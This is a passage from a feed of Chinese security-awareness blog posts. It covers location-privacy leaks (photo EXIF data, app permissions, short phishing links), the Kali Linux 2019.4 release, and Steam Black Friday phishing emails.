data-rawwidth=&quot;426&quot; data-rawheight=&quot;317&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;426&quot; data-original=&quot;https://pic4.zhimg.com/v2-41bbd5e0635743f33a0fc137f2acc34f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-41bbd5e0635743f33a0fc137f2acc34f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;哦豁，成功的把我出卖（我还能说什么，怪我咯！）。。。&lt;/p&gt;&lt;p&gt;还有一些特殊的QQ，简单讲一下吧。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-196ae92b7c1a6255da1d322b48ba5e92_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1170&quot; data-rawheight=&quot;866&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1170&quot; data-original=&quot;https://pic3.zhimg.com/v2-196ae92b7c1a6255da1d322b48ba5e92_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-196ae92b7c1a6255da1d322b48ba5e92_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1170&quot; data-rawheight=&quot;866&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1170&quot; data-original=&quot;https://pic3.zhimg.com/v2-196ae92b7c1a6255da1d322b48ba5e92_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-196ae92b7c1a6255da1d322b48ba5e92_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可以在聊天的时候获取你的 IP信息、定位、GPS、经纬度等等。&lt;/p&gt;&lt;p&gt;虽然这些东西抓包可能都可以获取到，但是随便聊两句天别人就知道你在哪儿是真的挺可怕的。&lt;/p&gt;&lt;h2&gt;二：APP风波、未知链接？&lt;/h2&gt;&lt;p&gt;来看看前段时间的这个新闻。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-08e7d76fe706f76e358c275f57c6722a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;941&quot; data-rawheight=&quot;859&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;941&quot; data-original=&quot;https://pic3.zhimg.com/v2-08e7d76fe706f76e358c275f57c6722a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-08e7d76fe706f76e358c275f57c6722a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;941&quot; data-rawheight=&quot;859&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;941&quot; data-original=&quot;https://pic3.zhimg.com/v2-08e7d76fe706f76e358c275f57c6722a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-08e7d76fe706f76e358c275f57c6722a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;细思极恐，每天刷着手机，突然一天多了双眼睛在看你？&lt;/p&gt;&lt;blockquote&gt;你站在桥上看风景，看风景的人在楼上看你。&lt;/blockquote&gt;&lt;p&gt;亦或是，当你安装某一 APP 时，向你提出权限请求（有些软件不允许就直接不让安装或不让你用）。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dbec191c413657ddde8868293774b938_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;671&quot; data-rawheight=&quot;345&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;671&quot; data-original=&quot;https://pic1.zhimg.com/v2-dbec191c413657ddde8868293774b938_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dbec191c413657ddde8868293774b938_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;671&quot; data-rawheight=&quot;345&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;671&quot; data-original=&quot;https://pic1.zhimg.com/v2-dbec191c413657ddde8868293774b938_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-dbec191c413657ddde8868293774b938_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以，不法分子，有通过这样的权限获取机制获取你的位置信息（比如，一些获取完信息就闪退的软件）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;“一刀满级，三秒土豪”“屠龙宝刀点击就送”？？？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;相信你们都知道这些广告，一些钓鱼邮件、短信之类的也存在这种未知链接。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4d398ec668226d21e4bec96a732180e0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;852&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;924&quot; data-original=&quot;https://pic1.zhimg.com/v2-4d398ec668226d21e4bec96a732180e0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4d398ec668226d21e4bec96a732180e0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;852&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;924&quot; data-original=&quot;https://pic1.zhimg.com/v2-4d398ec668226d21e4bec96a732180e0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4d398ec668226d21e4bec96a732180e0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;光从表名上看完全看不出来什么危险，但是里面藏着危机重重。&lt;/p&gt;&lt;p&gt;网上有很多 url 短链接生成网站，再长的钓鱼链接都能变短，让你肉眼根本无法看穿，小手轻轻一点，别人就知道你在哪里了。&lt;/p&gt;&lt;h2&gt;三：发朋友圈泄露&lt;/h2&gt;&lt;p&gt;先不说照片上显示你在哪里了，如今很多手机相机都默认开启了地理位置收集功能。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9166b3548ba4aec2ad3ca750921de5fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;895&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;924&quot; data-original=&quot;https://pic3.zhimg.com/v2-9166b3548ba4aec2ad3ca750921de5fe_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9166b3548ba4aec2ad3ca750921de5fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;895&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;924&quot; data-original=&quot;https://pic3.zhimg.com/v2-9166b3548ba4aec2ad3ca750921de5fe_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9166b3548ba4aec2ad3ca750921de5fe_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;也就是说，你的每一张照片上，都有你的拍摄地的信息，包括经纬度、时间日期等等。&lt;/p&gt;&lt;p&gt;用 EXIF 查看器打开就可以看到。&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;可交换图像文件格式，&lt;/b&gt;是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ef4485612a7f9c75d81495bd71f0dfd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1002&quot; data-rawheight=&quot;556&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1002&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef4485612a7f9c75d81495bd71f0dfd7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ef4485612a7f9c75d81495bd71f0dfd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1002&quot; data-rawheight=&quot;556&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1002&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef4485612a7f9c75d81495bd71f0dfd7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-ef4485612a7f9c75d81495bd71f0dfd7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后通过经纬度，就可以大概知道你在哪里了。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ffb58497241ad3da878e6e149bee3f0c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1487&quot; data-rawheight=&quot;656&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1487&quot; data-original=&quot;https://pic1.zhimg.com/v2-ffb58497241ad3da878e6e149bee3f0c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ffb58497241ad3da878e6e149bee3f0c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1487&quot; data-rawheight=&quot;656&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1487&quot; data-original=&quot;https://pic1.zhimg.com/v2-ffb58497241ad3da878e6e149bee3f0c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-ffb58497241ad3da878e6e149bee3f0c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;四：快递盒子、外卖小票等等&lt;/h2&gt;&lt;p&gt;很多人可能都有这样的习惯，快递拆了就随手扔了盒子，当然，你的一些个人信息也就这样随手扔掉了。所以，我们都应该有这样的习惯：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a3f6149d2e3fad10e4bc580bb45e2057_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;532&quot; data-rawheight=&quot;326&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;532&quot; data-original=&quot;https://pic4.zhimg.com/v2-a3f6149d2e3fad10e4bc580bb45e2057_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a3f6149d2e3fad10e4bc580bb45e2057_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;532&quot; data-rawheight=&quot;326&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;532&quot; data-original=&quot;https://pic4.zhimg.com/v2-a3f6149d2e3fad10e4bc580bb45e2057_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a3f6149d2e3fad10e4bc580bb45e2057_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;一直有个疑问，有些快递点总是会把快递上的一个贴纸给撕下来，放一个大盒子里，也不知道是不是规定了要收集还在要上交之类的，搞不懂。。。最好不要像这样：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-edbf6a549fc2cabdb883c3b1ef1dd222_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;284&quot; data-rawheight=&quot;280&quot; class=&quot;content_image&quot; width=&quot;284&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-edbf6a549fc2cabdb883c3b1ef1dd222_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;284&quot; data-rawheight=&quot;280&quot; class=&quot;content_image lazy&quot; width=&quot;284&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-edbf6a549fc2cabdb883c3b1ef1dd222_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以，处理好你的小票、快递盒等等。&lt;/p&gt;&lt;p&gt;💢综合以上所述，你大概知道为什么感觉自己被监控了吗？知道为什么别人知道你在哪儿了吗？&lt;/p&gt;&lt;p&gt;提高安全意识，保护好自己。当然，也不止以上所说的这些情况，说不定还有别的地方把你“出卖”了。&lt;/p&gt;&lt;h2&gt;kali🎮&lt;/h2&gt;&lt;p&gt;近日，kali 发布最新版本了 2019.4 版本🎈🎈🎈&lt;/p&gt;&lt;p&gt;官网下载：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.kali.org/downloads/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;kali.org/downloads/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;镜像下载：&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//mirrors.163.com/kali-images/kali-2019.4/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;mirrors.163.com/kali-im&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ages/kali-2019.4/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;这是 Kali Linux 渗透测试平台的最新版本。新版本包括几个新功能，包括新的默认桌面环境，新主题和供在公共场所进行评估工作的渗透测试者使用的新模式—— undercover模式。&lt;/p&gt;&lt;p&gt;&lt;b&gt;新版 kali 开机（炫酷max）：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-2b8ba422ca94b58615c68f2fd02f87a5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;从 Gnome 移至 Xfce&lt;/b&gt;&lt;/p&gt;&lt;p&gt;2019.4 版本中最值得注意的方面是 Kali 从 Gnome 环境迁移到 Xfce 以解决一些已知问题。新环境带来的具体改进包括：&lt;/p&gt;&lt;p&gt;&lt;b&gt;01.改进的性能&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Gnome 环境是具有许多功能的全功能桌面环境。但是，所有功能都带有开销，这对于像 Kali 这样的发行版来说通常是没有用的。转向更轻量级的 Xfce 环境可以解决这些问题，从而提供一个更符合典型 Kali 用户需求的环境。&lt;/p&gt;&lt;p&gt;&lt;b&gt;02.统一的UI&lt;/b&gt;&lt;/p&gt;&lt;p&gt;因为 Kali 可以在从裸机到高端笔记本电脑的所有设备上运行，所以低端 ARM 版本通常具有与其他部署不同的 UI。现在，作者为所有 Kali 发行版提供了标准化的 UI。&lt;/p&gt;&lt;p&gt;&lt;b&gt;undercover 模式&lt;/b&gt;&lt;/p&gt;&lt;p&gt;假设在公共场所工作，你可能不希望独特且显眼的 Kali 壁纸让所有人都看到你在使用 kali。比如在教室上计算机方面的课的时候，开启 kali 就会吸引来同学们异样的眼光。。。&lt;/p&gt;&lt;p&gt;开发人员编写了一个小脚本，它可以把你的 Kali 主题更改为默认的 Windows 主题。（可以“为所欲为”的在教室玩 kali 了~）这样，你就可以“隐身”工作。等方便的时候，再次运行脚本，就可以切换回 Kali 主题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;“隐身”演示：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;421&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;421&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-e1901f96e600c624cfa55d6a34471dbd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;今天的内容就简单介绍到这里了。更多有关内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-28-94121317</guid>
<pubDate>Thu, 28 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>Steam黑色星期五，我差点就被钓鱼了【附：钓鱼事故集】</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-27-93962838.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/93962838&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;黑色星期五🖤&lt;/h2&gt;&lt;p&gt;距黑色星期五（2019年11月29日）还有两天了，很多商家已经开始了优惠推广活动了（国内偏少），这么好的机会岂能放过。那它到底和网络安全有什么关系呢？&lt;/p&gt;&lt;blockquote&gt;圣诞节大采购一般是从感恩节之后开始的。感恩节是每年11月的第四个星期四，因此它的第二天，也是美国人大采购的第一天。在这一天，美国的商场都会推出大量的打折和优惠活动，以在年底进行最后一次大规模的促销。而感恩节后的这个星期五人们疯狂的抢购使得商场利润大增，因此被商家们称作黑色星期五。商家期望通过以这一天开始的圣诞大采购为这一年获得最多的盈利。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;Steam的黑色星期五&lt;/b&gt;&lt;/p&gt;&lt;p&gt;好吧，steam 的秋促以及开始了（也就是玩家口中的“黑色星期五”），将会对多种商品进行限时折扣。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b098236cc2c8b9eca0b2d591ca83340d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1060&quot; data-rawheight=&quot;385&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1060&quot; data-original=&quot;https://pic2.zhimg.com/v2-b098236cc2c8b9eca0b2d591ca83340d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b098236cc2c8b9eca0b2d591ca83340d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1060&quot; data-rawheight=&quot;385&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1060&quot; data-original=&quot;https://pic2.zhimg.com/v2-b098236cc2c8b9eca0b2d591ca83340d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b098236cc2c8b9eca0b2d591ca83340d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;又是新的一波绿BUFF，你们的钱包撑得住吗？&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7678a6b967ca3f4621e6ce1f5f32c18a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic3.zhimg.com/v2-7678a6b967ca3f4621e6ce1f5f32c18a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7678a6b967ca3f4621e6ce1f5f32c18a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic3.zhimg.com/v2-7678a6b967ca3f4621e6ce1f5f32c18a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7678a6b967ca3f4621e6ce1f5f32c18a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;（咳咳，跑题了）&lt;/p&gt;&lt;p&gt;相信你们跟我一样，已经收到了官方的折扣邮件，像这样：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-688bb7023f533468bc4f1fb50ee5e88d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-688bb7023f533468bc4f1fb50ee5e88d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-688bb7023f533468bc4f1fb50ee5e88d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-688bb7023f533468bc4f1fb50ee5e88d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-688bb7023f533468bc4f1fb50ee5e88d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;这有什么问题吗？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;问题就出在这里，就在上个周，我的小伙伴给我发来的求助消息&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a62b9bdbe785058a273c0768df782266_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;682&quot; data-rawheight=&quot;1501&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;682&quot; data-original=&quot;https://pic3.zhimg.com/v2-a62b9bdbe785058a273c0768df782266_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a62b9bdbe785058a273c0768df782266_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;682&quot; data-rawheight=&quot;1501&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;682&quot; data-original=&quot;https://pic3.zhimg.com/v2-a62b9bdbe785058a273c0768df782266_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a62b9bdbe785058a273c0768df782266_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;下面是他的邮箱提醒截图&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-390cfccd794c84bf44ad3f28e00d6212_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;1560&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic3.zhimg.com/v2-390cfccd794c84bf44ad3f28e00d6212_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-390cfccd794c84bf44ad3f28e00d6212_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;1560&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic3.zhimg.com/v2-390cfccd794c84bf44ad3f28e00d6212_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-390cfccd794c84bf44ad3f28e00d6212_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;emmm，一连串的登录验证提示以及改绑提示？！&lt;/p&gt;&lt;p&gt;这是什么原因呢？为什么会出现这种情况？&lt;/p&gt;&lt;h2&gt;钓鱼网站、钓鱼邮件❓&lt;/h2&gt;&lt;p&gt;这一切的一切都是钓鱼网站搞的鬼。&lt;/p&gt;&lt;blockquote&gt;钓鱼网站是指欺骗用户的虚假网站。“钓鱼网站”的页面与真实网站界面基本一致，欺骗消费者或者窃取访问者提交的账号和密码信息。钓鱼网站一般只有一个或几个页面，和真实网站差别细微。&lt;/blockquote&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bbdc36a1db97bed4e2e37d15ad3bed90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;331&quot; data-rawheight=&quot;220&quot; class=&quot;content_image&quot; width=&quot;331&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bbdc36a1db97bed4e2e37d15ad3bed90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;331&quot; data-rawheight=&quot;220&quot; class=&quot;content_image lazy&quot; width=&quot;331&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-bbdc36a1db97bed4e2e37d15ad3bed90_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可以采取多种形式轻易地获取个人信息或凭证。可能是在诱使用户在看起来合法的网站上输入个人凭证，用户名密码等等，该网站会将信息反馈给攻击者。通常，受害者会收到一封看起来像是来自真实企业的电子邮件，例如steam的打折资讯或某某银行的个人账单，然后引诱用户登录。所以，当你进行登录时，你的个人信息等就会被窃取。&lt;/p&gt;&lt;p&gt;简单来说，就是你有个儿子，突然一天出来一个跟你儿子长得差不多的“假儿子”叫你“爸爸”给钱。。。这就是钓鱼网站。&lt;/p&gt;&lt;p&gt;其实钓鱼攻击在我们的生活中随处可见（好吧，可能是攻击者觉得我比较好骗，我老是收到这种邮件），需要培养安全意识，但是防不胜防呀。它会使用各种方法诱骗你点击它的钓鱼链接，或者伪装成你想点的链接，比如刚才的Steam绿BUFF，就问你心不心动，想不想点！？&lt;/p&gt;&lt;p&gt;举个例子，比如说这是我们学院的官网，&lt;a 